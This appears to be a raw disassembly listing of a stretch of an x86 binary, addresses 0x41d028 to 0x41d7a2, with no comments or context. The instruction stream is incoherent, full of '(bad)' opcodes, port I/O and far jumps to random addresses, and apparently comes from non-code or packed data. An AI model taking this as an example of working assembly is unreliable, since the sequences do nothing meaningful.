  41d028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d029:	ret    
  41d02a:	scas   eax,DWORD PTR es:[edi]
  41d02b:	mov    esp,0xf0e4f49e
  41d030:	test   eax,0xe909d210
  41d035:	aaa    
  41d036:	imul   ebp,DWORD PTR [esi],0x2f275968
  41d03c:	sbb    al,0xc6
  41d03e:	mov    dh,0x1e
  41d040:	lods   al,BYTE PTR ds:[esi]
  41d041:	in     al,0x1b
  41d043:	mov    WORD PTR [ecx-0x68a397bd],ds
  41d049:	out    dx,eax
  41d04a:	xchg   ebp,eax
  41d04b:	mov    ds:0x63019d33,eax
  41d050:	cmc    
  41d051:	add    eax,0xc9bb7c36
  41d056:	ja     0x41d02c
  41d058:	xchg   ebp,eax
  41d059:	lea    esp,[ebx]
  41d05b:	(bad)  
  41d05d:	xlat   BYTE PTR ds:[ebx]
  41d05e:	and    esp,DWORD PTR [edx]
  41d060:	pop    DWORD PTR [esi]
  41d062:	gs mov ch,0xef
  41d065:	jbe    0x41d025
  41d067:	and    al,0x7f
  41d069:	push   0x3f89423f
  41d06e:	lock out dx,al
  41d070:	xor    DWORD PTR [eax-0x556c8584],0x14
  41d077:	xchg   edx,eax
  41d078:	xor    DWORD PTR [ebp+0x79],edi
  41d07b:	ss into 
  41d07d:	add    ecx,DWORD PTR [eax]
  41d07f:	dec    ebp
  41d080:	aaa    
  41d081:	mov    eax,0xaeb61735
  41d086:	sar    BYTE PTR [ebp+0x38],cl
  41d089:	ss popf 
  41d08b:	iret   
  41d08c:	pop    ss
  41d08d:	lds    edx,FWORD PTR [eax-0x41014cab]
  41d093:	fcomp  DWORD PTR [ebx+edx*8-0x7f]
  41d097:	retf   0xbd46
  41d09a:	jle    0x41d04d
  41d09c:	dec    ebp
  41d09d:	lea    ecx,[esi+0x21]
  41d0a0:	xor    al,0x49
  41d0a2:	int3   
  41d0a3:	in     al,0x14
  41d0a5:	push   0xffffffd8
  41d0a7:	push   es
  41d0a8:	sbb    ebp,DWORD PTR [ecx]
  41d0aa:	jp     0x41d0dd
  41d0ac:	imul   edi,esp,0x217293f4
  41d0b2:	pop    eax
  41d0b4:	dec    esp
  41d0b5:	sbb    eax,0x6d00c2ad
  41d0ba:	loopne 0x41d0b8
  41d0bc:	sbb    ch,bh
  41d0be:	mov    edx,0x27ca123a
  41d0c3:	cmp    al,0x81
  41d0c6:	sub    al,0x9a
  41d0c8:	adc    eax,0xc92ced7b
  41d0cd:	in     eax,dx
  41d0ce:	jg     0x41d06b
  41d0d0:	popf   
  41d0d1:	pop    eax
  41d0d2:	mov    al,0x48
  41d0d4:	inc    edx
  41d0d5:	push   0x46
  41d0d7:	inc    edi
  41d0d8:	inc    ebx
  41d0d9:	push   esp
  41d0da:	ss jecxz 0x41d0b0
  41d0dd:	or     dh,BYTE PTR [ebp+0x5c]
  41d0e0:	imul   eax,DWORD PTR [ebx-0x52],0xffffffc1
  41d0e4:	mov    eax,ds:0x84b89196
  41d0e9:	xor    eax,0x9d6ceb1b
  41d0ee:	adc    esp,DWORD PTR [ebx-0x54a10fc9]
  41d0f4:	je     0x41d174
  41d0f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0f7:	sub    eax,0x6b5fea47
  41d0fc:	aam    0x3f
  41d0fe:	xchg   edi,eax
  41d0ff:	fcmovnb st,st(0)
  41d101:	mov    cl,0xe2
  41d103:	push   0x7f
  41d105:	cdq    
  41d106:	pmulhuw mm1,QWORD PTR [eax+ecx*4+0x7239825a]
  41d10e:	xor    ebx,eax
  41d110:	cs ret 0x359
  41d114:	mov    dl,0xfb
  41d116:	mov    dh,ch
  41d118:	mov    gs,ebp
  41d11a:	jns    0x41d0dd
  41d11c:	add    ebp,DWORD PTR [eax-0x7e3081f]
  41d122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d123:	lock xor cl,ah
  41d126:	(bad)  
  41d128:	cmp    ch,bh
  41d12a:	fld    st(1)
  41d12c:	inc    esp
  41d12d:	ja     0x41d0c9
  41d12f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d130:	mov    ds:0x5dcac5e2,al
  41d135:	aas    
  41d136:	adc    DWORD PTR [ecx+ebp*8],ecx
  41d139:	test   ecx,esi
  41d13b:	push   esp
  41d13c:	int3   
  41d13d:	pop    ebp
  41d13e:	(bad)  
  41d13f:	out    0xc2,al
  41d141:	in     al,0x4d
  41d143:	sar    BYTE PTR [edi],cl
  41d145:	sub    eax,0x757f8576
  41d14a:	fwait
  41d14b:	jmp    0xf3cd:0x72230329
  41d152:	cmp    al,0x19
  41d154:	ror    DWORD PTR [eax],cl
  41d156:	jmp    0x3ea6c851
  41d15b:	js     0x41d16a
  41d15d:	pop    esp
  41d15e:	cmp    al,0xeb
  41d160:	mov    ebp,0x7377f858
  41d165:	inc    ecx
  41d166:	ds dec ebx
  41d168:	test   BYTE PTR [edi+ecx*2],bl
  41d16b:	xlat   BYTE PTR ds:[ebx]
  41d16c:	ret    
  41d16d:	aad    0xb8
  41d16f:	addr16 and ch,ch
  41d172:	pop    eax
  41d173:	inc    ebx
  41d174:	imul   di,WORD PTR [ebx],0xffd1
  41d178:	imul   edx,DWORD PTR [ecx],0xffffff91
  41d17b:	out    dx,eax
  41d17c:	cld    
  41d17d:	pop    esp
  41d17e:	cmp    edx,edx
  41d180:	mov    ds:0x4c6fa944,al
  41d185:	push   ebp
  41d186:	enter  0xb899,0x34
  41d18a:	(bad)  
  41d18b:	in     eax,0xb5
  41d18d:	push   ecx
  41d18e:	adc    DWORD PTR [edi+ecx*2],ebp
  41d191:	retf   0xe9a5
  41d194:	mov    esp,0x64d74f0
  41d199:	leave  
  41d19a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d19b:	push   cs
  41d19c:	pop    ds
  41d19d:	cld    
  41d19e:	loop   0x41d1af
  41d1a0:	dec    esp
  41d1a1:	ja     0x41d1a9
  41d1a3:	ficomp WORD PTR [ecx+edx*8]
  41d1a6:	jmp    0x7a1bc3ec
  41d1ab:	out    0x50,eax
  41d1ad:	bnd jo 0x41d1f1
  41d1b0:	mov    dh,0xf4
  41d1b2:	popf   
  41d1b3:	imul   ebx,DWORD PTR [esi-0x5dddba14],0xffffffa6
  41d1ba:	fidivr WORD PTR [ebp+0x64]
  41d1bd:	mov    eax,ds:0x6ec842cf
  41d1c2:	jp     0x41d1c2
  41d1c4:	js     0x41d1fa
  41d1c6:	xor    eax,0x64271f41
  41d1cb:	add    al,0xc4
  41d1cd:	mov    bh,0xd2
  41d1cf:	test   BYTE PTR [eax],cl
  41d1d1:	shr    esi,1
  41d1d3:	xlat   BYTE PTR ds:[ebx]
  41d1d4:	mov    dh,0x3c
  41d1d6:	ret    
  41d1d7:	jmp    0x41d1e0
  41d1d9:	call   0x8c861afa
  41d1de:	aaa    
  41d1df:	dec    ebp
  41d1e0:	pop    ss
  41d1e1:	inc    edx
  41d1e2:	fcmovnb st,st(4)
  41d1e4:	mov    eax,esi
  41d1e6:	popa   
  41d1e7:	loope  0x41d1f3
  41d1e9:	inc    esp
  41d1ea:	xchg   esp,eax
  41d1eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1ec:	jbe    0x41d269
  41d1ee:	sub    al,0x5e
  41d1f0:	test   DWORD PTR [edi],edx
  41d1f2:	ins    BYTE PTR es:[edi],dx
  41d1f3:	test   eax,0x33be82ff
  41d1f8:	enter  0xd7f6,0xd6
  41d1fc:	push   ebp
  41d1fd:	sbb    ch,BYTE PTR [ecx-0x6ed211d0]
  41d203:	jg     0x41d1d5
  41d205:	cmp    al,BYTE PTR [eax-0x56e8fe9d]
  41d20b:	pop    es
  41d20c:	test   bh,bh
  41d20e:	sbb    ah,dh
  41d210:	out    dx,eax
  41d211:	push   cs
  41d212:	push   eax
  41d213:	aam    0x57
  41d215:	not    edi
  41d217:	xor    edi,esi
  41d219:	lea    ebx,[ebx+0x3]
  41d21c:	dec    edi
  41d21d:	fwait
  41d21e:	adc    esi,DWORD PTR [eax+0xe]
  41d221:	xor    ebp,0xffffffad
  41d224:	lds    esi,FWORD PTR [edi+0x13f26b0e]
  41d22a:	cmp    DWORD PTR [esp+esi*4],esi
  41d22d:	gs and al,0x2c
  41d230:	cmp    dh,dl
  41d232:	(bad)  
  41d234:	ja     0x41d269
  41d236:	mov    esi,0x42b71b60
  41d23b:	jmp    0x41d24c
  41d23d:	or     eax,0x70f72543
  41d242:	pop    ebx
  41d243:	fnsave [esi]
  41d245:	inc    esi
  41d246:	(bad)  
  41d247:	push   edx
  41d248:	push   esp
  41d249:	addr16 xchg ecx,eax
  41d24b:	cwde   
  41d24c:	inc    esp
  41d24d:	(bad)  
  41d24e:	lea    eax,[esp+ecx*8+0x337c2dae]
  41d255:	repz mov ebx,0x4ba1c4e4
  41d25b:	inc    esi
  41d25c:	aas    
  41d25d:	fs jmp 0xb6cd:0xb35d60dd
  41d265:	sbb    eax,0xc3f14908
  41d26a:	nop
  41d26b:	sbb    al,0xfc
  41d26d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d26e:	cli    
  41d26f:	sub    al,0x85
  41d271:	fs popa 
  41d273:	jno    0x41d224
  41d275:	inc    esp
  41d276:	sahf   
  41d277:	mov    eax,0xd349a7d7
  41d27c:	adc    ebx,esi
  41d27e:	sub    BYTE PTR [esp+ebx*2],bl
  41d281:	div    eax
  41d283:	jp     0x41d20c
  41d285:	popf   
  41d286:	stc    
  41d287:	pusha  
  41d288:	fcmove st,st(5)
  41d28a:	stos   BYTE PTR es:[edi],al
  41d28b:	mov    esp,0x469a382f
  41d290:	(bad)  [eax]
  41d292:	scas   al,BYTE PTR es:[edi]
  41d293:	lods   al,BYTE PTR ds:[esi]
  41d294:	scas   al,BYTE PTR es:[edi]
  41d295:	adc    DWORD PTR [eax+0xe7c5945],eax
  41d29b:	pop    ecx
  41d29c:	sbb    BYTE PTR ds:0xf564fcd8,0x79
  41d2a3:	inc    esp
  41d2a4:	jecxz  0x41d24d
  41d2a6:	push   esp
  41d2a7:	pop    edi
  41d2a8:	add    eax,0x5b0beda2
  41d2ad:	aas    
  41d2ae:	or     BYTE PTR [ecx+ecx*1+0x41cd6ff1],al
  41d2b5:	in     eax,dx
  41d2b6:	fwait
  41d2b7:	arpl   WORD PTR [ebp-0x5f],si
  41d2ba:	das    
  41d2bb:	adc    ah,al
  41d2bd:	and    al,0x8
  41d2bf:	lods   eax,DWORD PTR ds:[esi]
  41d2c0:	sub    BYTE PTR [esi-0x7776ce58],dh
  41d2c6:	mov    ecx,0x914fea59
  41d2cb:	pusha  
  41d2cc:	out    dx,al
  41d2cd:	in     eax,0x7e
  41d2cf:	mov    cl,0x29
  41d2d1:	test   BYTE PTR [ecx-0x7672b6df],bh
  41d2d7:	push   esp
  41d2d8:	jbe    0x41d25c
  41d2da:	test   eax,0xb0973b6
  41d2df:	(bad)  
  41d2e0:	dec    BYTE PTR [edi-0x23]
  41d2e3:	adc    DWORD PTR [edi+0xb],0xffffffac
  41d2e7:	clc    
  41d2e8:	and    DWORD PTR [edx-0x78],edi
  41d2eb:	push   ds
  41d2ec:	icebp  
  41d2ed:	int    0x85
  41d2ef:	inc    eax
  41d2f0:	sbb    BYTE PTR [ecx+0x1f],al
  41d2f3:	xor    DWORD PTR [ebp+0x67c42877],esi
  41d2f9:	and    BYTE PTR [ecx+edx*4+0x70e7382f],dl
  41d300:	je     0x41d310
  41d302:	push   edx
  41d303:	movsx  ecx,BYTE PTR ds:0xfc230074
  41d30a:	in     eax,dx
  41d30b:	test   BYTE PTR [esi-0x35076598],dh
  41d311:	test   ax,0x3ce9
  41d315:	xchg   ecx,edx
  41d317:	test   eax,0x94d0f38a
  41d31c:	mov    edi,0xc42b12f8
  41d321:	xchg   edi,eax
  41d322:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d323:	je     0x41d311
  41d325:	sti    
  41d326:	ret    
  41d327:	rcl    al,1
  41d329:	int3   
  41d32a:	jecxz  0x41d336
  41d32c:	neg    esi
  41d32e:	xor    ch,BYTE PTR [ebp-0x5c]
  41d331:	pop    es
  41d332:	mov    dh,0xcf
  41d334:	cli    
  41d335:	lock xor al,0x6b
  41d338:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d339:	test   bh,dh
  41d33b:	mov    ds:0x704b1eab,eax
  41d340:	cmp    DWORD PTR [edi+esi*1+0x3e],eax
  41d344:	cmp    BYTE PTR [ecx+0x5f],0x50
  41d348:	clc    
  41d349:	imul   edx,esi,0x1ff359c5
  41d34f:	es cs or eax,0xdaa99c21
  41d356:	fstp   DWORD PTR [esi+0x7d]
  41d359:	xor    dl,dl
  41d35b:	stc    
  41d35c:	aad    0xe6
  41d35e:	pop    esi
  41d35f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d360:	pop    esp
  41d361:	call   0x24d4185f
  41d366:	cmp    DWORD PTR [edx],edi
  41d368:	or     al,0xdc
  41d36a:	jmp    0x12f7de3f
  41d36f:	mov    edi,0xab1c15c8
  41d374:	add    eax,0x66dd2492
  41d379:	add    eax,0xc0abc5c0
  41d37e:	sub    al,0xa0
  41d380:	scas   eax,DWORD PTR es:[edi]
  41d381:	nop
  41d382:	or     esp,DWORD PTR [eax]
  41d384:	adc    dl,BYTE PTR [eax-0x6b9831a7]
  41d38a:	(bad)  
  41d38b:	jmp    0xa0c7:0x549959ce
  41d392:	jbe    0x41d3c4
  41d394:	jne    0x41d3f1
  41d396:	mov    esp,0xe4442824
  41d39b:	enter  0x9df6,0xb1
  41d39f:	xor    DWORD PTR [eax-0x6fb11a48],ebx
  41d3a5:	shr    ch,cl
  41d3a7:	cmp    al,0x6c
  41d3a9:	mov    ?,WORD PTR [ebp+0x65]
  41d3ac:	push   0xb50d6bab
  41d3b1:	into   
  41d3b2:	mov    bl,0xb
  41d3b4:	aas    
  41d3b5:	mov    BYTE PTR [ebx-0x57],bh
  41d3b8:	xor    DWORD PTR [ecx-0x66022ff],edi
  41d3be:	xlat   BYTE PTR ds:[ebx]
  41d3bf:	push   esi
  41d3c0:	jns    0x41d407
  41d3c2:	push   0xd
  41d3c4:	push   cs
  41d3c5:	loopne 0x41d442
  41d3c7:	or     eax,0x19a0bb99
  41d3cc:	cld    
  41d3cd:	mov    cl,0x71
  41d3cf:	inc    eax
  41d3d0:	scas   al,BYTE PTR es:[edi]
  41d3d1:	cmp    DWORD PTR [edi],esp
  41d3d3:	jmp    0xb1b7:0xfc0a5c8a
  41d3da:	ret    0xb072
  41d3dd:	inc    esp
  41d3de:	push   edx
  41d3df:	aas    
  41d3e0:	es push ecx
  41d3e2:	loopne 0x41d41a
  41d3e4:	retf   
  41d3e5:	loope  0x41d405
  41d3e7:	call   0x7faf:0xe99c22d3
  41d3ee:	mov    WORD PTR [edi-0x2c],fs
  41d3f1:	mov    bh,0x97
  41d3f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3f4:	sbb    bh,al
  41d3f6:	jo     0x41d45a
  41d3f8:	cmp    al,0x42
  41d3fa:	inc    edi
  41d3fb:	pop    esp
  41d3fc:	xor    eax,0xf4c5c6f1
  41d401:	pushf  
  41d402:	pop    edx
  41d403:	fstp   DWORD PTR [esi]
  41d405:	aas    
  41d406:	dec    esp
  41d407:	xchg   esp,eax
  41d408:	xchg   DWORD PTR [ebp+0x72],edi
  41d40b:	mov    esi,0x72a69940
  41d410:	sbb    esp,edx
  41d412:	test   BYTE PTR [eax+0x76],0x40
  41d416:	mov    esp,0x2da4ef78
  41d41b:	cli    
  41d41c:	aad    0xa4
  41d41e:	out    dx,eax
  41d41f:	mov    ds:0x62804ce9,al
  41d424:	adc    edx,DWORD PTR [ebx-0x79dcceab]
  41d42a:	stc    
  41d42b:	xchg   ebx,eax
  41d42c:	mov    bh,0x2b
  41d42e:	mov    bh,0x8e
  41d430:	pusha  
  41d431:	aas    
  41d432:	jge    0x41d3fd
  41d434:	sbb    esp,eax
  41d436:	in     eax,dx
  41d437:	(bad)  [ebp-0x725dfc20]
  41d43d:	xor    al,0x24
  41d43f:	fadd   DWORD PTR [ebp-0x46]
  41d442:	mov    esi,0x359e8375
  41d447:	and    DWORD PTR [esi-0x31],ecx
  41d44a:	je     0x41d492
  41d44c:	sbb    eax,0xb255d458
  41d451:	and    edx,DWORD PTR [ecx]
  41d453:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d454:	int3   
  41d455:	sbb    ecx,DWORD PTR [edi-0x6d]
  41d458:	sbb    cl,bl
  41d45a:	pop    ebx
  41d45b:	dec    eax
  41d45c:	neg    DWORD PTR [eax-0x30c0f05]
  41d462:	jmp    0x905c:0xa8ca83d9
  41d469:	aad    0x9
  41d46b:	(bad)  
  41d46c:	cmp    eax,0xaae75272
  41d471:	in     al,0x20
  41d473:	pop    edi
  41d474:	imul   esi,DWORD PTR [ecx],0xb2ffde7e
  41d47a:	sub    DWORD PTR [edx-0x4a],0x73
  41d47e:	jnp    0x41d4db
  41d480:	mov    ebp,0xfa9f261f
  41d485:	(bad)  
  41d486:	adc    al,0x31
  41d488:	inc    edx
  41d489:	cdq    
  41d48a:	sahf   
  41d48b:	pop    edx
  41d48c:	mov    ebp,0xf9d9e0a
  41d491:	into   
  41d492:	mov    bh,BYTE PTR [eax-0x625fbdb2]
  41d498:	and    bh,BYTE PTR [ebx+0x58]
  41d49b:	jo     0x41d4ac
  41d49d:	aaa    
  41d49e:	or     DWORD PTR [esi],eax
  41d4a0:	mov    dh,0xa4
  41d4a2:	(bad)  
  41d4a4:	retf   
  41d4a5:	(bad)  
  41d4a6:	jmp    0x41d479
  41d4a8:	ins    DWORD PTR es:[edi],dx
  41d4a9:	mov    esi,0x316eee99
  41d4ae:	inc    ebp
  41d4af:	inc    ebp
  41d4b0:	and    DWORD PTR [edx],ebp
  41d4b2:	scas   al,BYTE PTR es:[edi]
  41d4b3:	and    BYTE PTR [eax+0x305b178b],dl
  41d4b9:	retf   
  41d4ba:	add    bl,BYTE PTR [edx-0xb82d59f]
  41d4c0:	mov    ss,WORD PTR [edi]
  41d4c2:	cmp    eax,0xb91a8b9b
  41d4c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4c8:	sahf   
  41d4c9:	hlt    
  41d4ca:	fsubr  DWORD PTR ds:0x6ecc4844
  41d4d0:	cwde   
  41d4d1:	pusha  
  41d4d2:	mov    esp,0xab0c8181
  41d4d7:	push   edx
  41d4d8:	shl    DWORD PTR [edi-0x53d41084],cl
  41d4de:	xlat   BYTE PTR ds:[ebx]
  41d4df:	gs mov ecx,0x2de117de
  41d4e5:	add    DWORD PTR [ebp-0x7ebdddf5],ebx
  41d4eb:	gs hlt 
  41d4ed:	push   esi
  41d4ee:	jp     0x41d4c8
  41d4f0:	mov    edi,0x5bcf7307
  41d4f5:	mov    ds,WORD PTR [edi-0x1a]
  41d4f8:	sub    eax,DWORD PTR ds:0xe2ad165e
  41d4fe:	push   cs
  41d4ff:	mov    ecx,?
  41d501:	ret    
  41d502:	retf   
  41d503:	sub    eax,edi
  41d505:	std    
  41d506:	stc    
  41d507:	mov    esp,0x6c9d7017
  41d50c:	jecxz  0x41d4c0
  41d50e:	jecxz  0x41d4e6
  41d510:	clc    
  41d511:	pushf  
  41d512:	fwait
  41d513:	sbb    al,0x79
  41d515:	rcr    DWORD PTR [ebx-0x45],1
  41d518:	lds    edi,FWORD PTR [esi]
  41d51a:	sar    esp,1
  41d51c:	pop    ds
  41d51d:	jg     0x41d4f0
  41d51f:	push   esp
  41d520:	add    ebx,DWORD PTR [esi+0x66]
  41d523:	nop
  41d524:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d525:	xchg   ecx,eax
  41d526:	add    dh,al
  41d528:	outs   dx,DWORD PTR ds:[esi]
  41d529:	test   DWORD PTR [ecx-0x22bf1a9],ebx
  41d52f:	xchg   esi,eax
  41d530:	fimul  WORD PTR [ecx-0x739c326c]
  41d536:	out    dx,al
  41d537:	test   DWORD PTR [ebx-0x3bc660f8],eax
  41d53d:	mov    dl,0xb
  41d53f:	mov    al,0x45
  41d541:	(bad)  
  41d542:	call   0xeb7c:0x169b0ec7
  41d549:	push   edi
  41d54a:	mov    edi,0x28cfd91c
  41d54f:	jl     0x41d51c
  41d551:	dec    ebx
  41d552:	les    esp,FWORD PTR [ebx-0x3d791464]
  41d558:	rol    DWORD PTR [esi-0x7a],0x7f
  41d55c:	(bad)  
  41d55d:	pop    esi
  41d55e:	xchg   BYTE PTR [ecx+0x4df87d6f],cl
  41d564:	std    
  41d565:	pop    esi
  41d566:	shl    BYTE PTR [esi-0x52],1
  41d569:	(bad)  
  41d56a:	pop    ds
  41d56b:	dec    edx
  41d56c:	mov    ah,0x3e
  41d56e:	cli    
  41d56f:	mov    ebp,0xdd5f18d6
  41d574:	xor    ah,BYTE PTR [edi+eiz*8-0x80]
  41d578:	jmp    0xffe2:0xc1f2d2d2
  41d57f:	mov    ch,cl
  41d581:	rcl    BYTE PTR [ebp-0x518b2cc9],cl
  41d587:	dec    ecx
  41d588:	imul   edi,DWORD PTR ss:[esi+0xd],0xffffff83
  41d58d:	dec    ecx
  41d58e:	push   esi
  41d58f:	fdiv   DWORD PTR [ebx+eax*8]
  41d592:	mov    BYTE PTR [esi+0x0],ch
  41d595:	ja     0x41d56e
  41d597:	inc    ebp
  41d598:	xlat   BYTE PTR ds:[ebx]
  41d599:	dec    ebp
  41d59a:	push   esp
  41d59b:	push   ebp
  41d59c:	in     al,0xdd
  41d59e:	xor    edi,esi
  41d5a0:	cli    
  41d5a1:	in     eax,0x35
  41d5a3:	xchg   edi,eax
  41d5a4:	out    0x1f,eax
  41d5a6:	xchg   edi,eax
  41d5a7:	cli    
  41d5a8:	add    DWORD PTR [edi-0x68],0x2
  41d5ac:	mov    ah,0xd9
  41d5ae:	push   edx
  41d5af:	mov    BYTE PTR [edx-0x55d19c68],0x73
  41d5b6:	xlat   BYTE PTR ds:[ebx]
  41d5b7:	sbb    eax,0xb6d51510
  41d5bc:	pop    es
  41d5bd:	push   esp
  41d5be:	ret    0x2be4
  41d5c1:	push   esi
  41d5c2:	fmul   DWORD PTR [ecx]
  41d5c4:	fcomp  QWORD PTR [ebx]
  41d5c6:	cmp    eax,0x29d73b38
  41d5cb:	(bad)  
  41d5cc:	shr    BYTE PTR [edx+0x4dc89dc3],1
  41d5d2:	jnp    0x41d5ed
  41d5d4:	mov    edi,0x220fe089
  41d5d9:	aas    
  41d5da:	into   
  41d5db:	jb     0x41d639
  41d5dd:	es mov eax,0x59ffc3c3
  41d5e3:	mov    eax,0x9ad6e7a5
  41d5e8:	jg     0x41d5a0
  41d5ea:	out    dx,eax
  41d5eb:	jno    0x41d5a9
  41d5ed:	push   0xc192e1e9
  41d5f2:	mov    ebp,0x432eaf8d
  41d5f7:	fnsave [ebp-0x67]
  41d5fa:	addr16 mov al,ds:0xb906
  41d5fe:	jg     0x41d62a
  41d600:	sar    DWORD PTR [edi+0x71102845],0xfc
  41d607:	add    BYTE PTR ds:0x52a615c9,bl
  41d60d:	(bad)  
  41d60e:	mov    BYTE PTR [ebx-0x15],bl
  41d611:	bound  edi,QWORD PTR [ecx+eiz*4]
  41d614:	(bad)  
  41d615:	shl    DWORD PTR [esi+0x2c40f7e1],cl
  41d61b:	add    ebx,edi
  41d61d:	pop    edi
  41d61e:	cmp    DWORD PTR [ebx],0xb94651a7
  41d624:	fcom   st(6)
  41d626:	fld    TBYTE PTR [ebx-0x6a]
  41d629:	cli    
  41d62a:	out    dx,eax
  41d62b:	sub    eax,0xba08866b
  41d630:	jno    0x41d68a
  41d632:	push   0x83863841
  41d637:	push   esi
  41d638:	hlt    
  41d639:	lods   al,BYTE PTR ds:[esi]
  41d63a:	call   FWORD PTR [ecx-0x76]
  41d63d:	push   edx
  41d63e:	mov    bl,0x74
  41d640:	and    cl,BYTE PTR [edx]
  41d642:	pop    edi
  41d643:	lock fsubp st(4),st
  41d646:	or     esi,ecx
  41d648:	and    al,0x70
  41d64a:	inc    edi
  41d64b:	cmp    DWORD PTR [bx+si-0x6e97],ecx
  41d650:	push   eax
  41d651:	and    eax,0x56a7878f
  41d656:	add    al,0x7c
  41d658:	loope  0x41d6ad
  41d65a:	imul   ebp,DWORD PTR [edx+0x323a2507],0xffffff94
  41d661:	inc    esp
  41d662:	mov    esp,0xf438871b
  41d667:	add    ebp,edx
  41d669:	out    0x1d,al
  41d66b:	add    eax,0xfc8e94e0
  41d670:	dec    ebx
  41d671:	call   FWORD PTR [ecx+ebx*1]
  41d674:	jecxz  0x41d606
  41d676:	stos   DWORD PTR es:[edi],eax
  41d677:	test   al,0x1f
  41d679:	in     eax,dx
  41d67a:	dec    edx
  41d67b:	loopne 0x41d6c1
  41d67d:	aas    
  41d67e:	cmp    bh,dh
  41d680:	xor    ah,BYTE PTR [ecx+0x57]
  41d683:	mov    BYTE PTR [edi+0x7b27feeb],dh
  41d689:	or     edx,DWORD PTR [esi-0x3]
  41d68c:	in     eax,0xc7
  41d68e:	sub    bh,BYTE PTR [ebx]
  41d690:	shr    DWORD PTR [ebp+0x4a],0x18
  41d694:	cdq    
  41d695:	inc    ebx
  41d696:	sbb    al,0x1e
  41d698:	in     eax,dx
  41d699:	xchg   BYTE PTR [esi-0x7e],cl
  41d69c:	mov    ds:0x32c3d347,al
  41d6a1:	mov    eax,0x14571481
  41d6a6:	add    DWORD PTR [ebx],ecx
  41d6a8:	jno    0x41d687
  41d6aa:	das    
  41d6ab:	jne    0x41d634
  41d6ad:	pop    esp
  41d6ae:	ss aaa 
  41d6b0:	cs out 0x59,eax
  41d6b3:	out    dx,al
  41d6b4:	xor    al,0x8b
  41d6b6:	ss jnp 0x41d684
  41d6b9:	cmp    eax,0x79ee42a5
  41d6be:	xchg   edi,edi
  41d6c0:	jno    0x41d64a
  41d6c2:	xor    DWORD PTR [ecx],ebp
  41d6c4:	stos   DWORD PTR es:[edi],eax
  41d6c5:	test   ebp,eax
  41d6c7:	fxch   st(7)
  41d6c9:	lods   eax,DWORD PTR ds:[esi]
  41d6ca:	cmp    esp,0x27
  41d6cd:	adc    esp,ebp
  41d6cf:	dec    edx
  41d6d0:	mov    ebx,0x7dcdc248
  41d6d5:	pop    ds
  41d6d6:	xchg   edx,eax
  41d6d7:	neg    edi
  41d6d9:	aad    0xaf
  41d6db:	pop    ss
  41d6dc:	fstp   TBYTE PTR [ecx+esi*1]
  41d6df:	clc    
  41d6e0:	mov    ch,0xb3
  41d6e2:	cmp    al,0x89
  41d6e4:	cmc    
  41d6e5:	or     ebx,DWORD PTR [edx]
  41d6e7:	test   al,0xc6
  41d6e9:	sbb    DWORD PTR [esi+0x11],esp
  41d6ec:	jg     0x41d745
  41d6ee:	adc    eax,0xb8c1bc0a
  41d6f3:	dec    edx
  41d6f4:	imul   esp,DWORD PTR [edx-0x56],0xffffff9d
  41d6f8:	pop    esi
  41d6f9:	lds    ecx,FWORD PTR [ebx+esi*8]
  41d6fc:	sub    al,0x8a
  41d6fe:	loop   0x41d6fc
  41d700:	pop    edx
  41d701:	out    0x89,al
  41d703:	xor    cl,bl
  41d705:	fs jo  0x41d713
  41d708:	jo     0x41d68d
  41d70a:	aad    0x68
  41d70c:	ins    DWORD PTR es:[edi],dx
  41d70d:	iret   
  41d70e:	jbe    0x41d734
  41d710:	mov    ch,0x39
  41d712:	mov    al,0xd4
  41d714:	or     ch,BYTE PTR [esi+0x13b155e]
  41d71a:	mov    esp,ebx
  41d71c:	scas   al,BYTE PTR es:[edi]
  41d71d:	and    DWORD PTR [ecx-0x6673deea],eax
  41d723:	div    DWORD PTR ds:0xcc054aa0
  41d729:	xchg   BYTE PTR [ecx+0x4d],dl
  41d72c:	push   ecx
  41d72d:	into   
  41d72e:	mov    ch,0x36
  41d730:	mov    cl,0x35
  41d732:	jne    0x41d780
  41d734:	aaa    
  41d735:	fsub   DWORD PTR [edi-0x67]
  41d738:	mov    ds:0x7240946e,eax
  41d73d:	js     0x41d73b
  41d73f:	lods   eax,DWORD PTR ds:[esi]
  41d740:	pushf  
  41d741:	out    0xfe,al
  41d743:	cmp    esi,DWORD PTR ds:0x2142fc45
  41d749:	dec    eax
  41d74a:	call   0x904f:0x39af1e12
  41d751:	cmp    BYTE PTR ds:0xf59f5e40,0x59
  41d758:	bound  edx,QWORD PTR [ebx-0x66dd58d6]
  41d75e:	pop    ss
  41d75f:	mov    cl,0x2d
  41d761:	test   al,0x21
  41d763:	push   esi
  41d764:	mov    edi,0xf8734ff7
  41d769:	scas   al,BYTE PTR es:[edi]
  41d76a:	sti    
  41d76b:	mov    edx,DWORD PTR [edi+ecx*2]
  41d76e:	jmp    0x257efbed
  41d773:	push   ecx
  41d774:	push   eax
  41d775:	pop    esp
  41d776:	loope  0x41d76c
  41d778:	fs ret 
  41d77a:	dec    ebx
  41d77b:	add    bl,BYTE PTR [esi]
  41d77d:	pop    esi
  41d77e:	cdq    
  41d77f:	add    eax,0x13194b28
  41d784:	xchg   ebp,eax
  41d785:	ds shl dh,1
  41d788:	es adc eax,0x5cd1e153
  41d78e:	pop    edi
  41d78f:	out    dx,al
  41d790:	bound  ebx,QWORD PTR [eax+ecx*4]
  41d793:	(bad)  
  41d794:	and    al,0xbc
  41d796:	lods   al,BYTE PTR ds:[esi]
  41d797:	sbb    cl,al
  41d799:	xchg   ebp,eax
  41d79a:	add    al,0x18
  41d79c:	lods   eax,DWORD PTR ds:[esi]
  41d79d:	push   0xffffffce
  41d79f:	loopne 0x41d7ef
  41d7a1:	iret   
  41d7a2:	sbb    BYTE PTR [eax+0x1ca66105],al
